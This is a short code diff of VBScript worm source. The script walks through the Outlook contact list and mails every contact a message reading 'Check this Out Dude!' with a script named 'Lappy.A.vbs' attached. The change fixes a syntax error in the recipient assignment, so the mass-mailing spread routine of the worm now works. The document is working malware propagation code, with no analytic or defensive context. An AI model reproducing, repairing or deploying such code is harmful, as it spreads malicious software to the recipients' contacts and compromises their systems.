@@ -33,7 +33,7 @@ Set objContacts = objNS.GetDefaultFolder(10).Items
 
 For Each objContact In objContacts
 If objContact.Class = 43 Then
-Set objMail.To = objContact.Email1Address
+objMail.To = objContact.Email1Address
 objMail.Body = "Check this Out Dude!"
 objMail.Attachments.Add strFilePath, 1, 0, "Lappy.A.vbs"
 objMail.Send
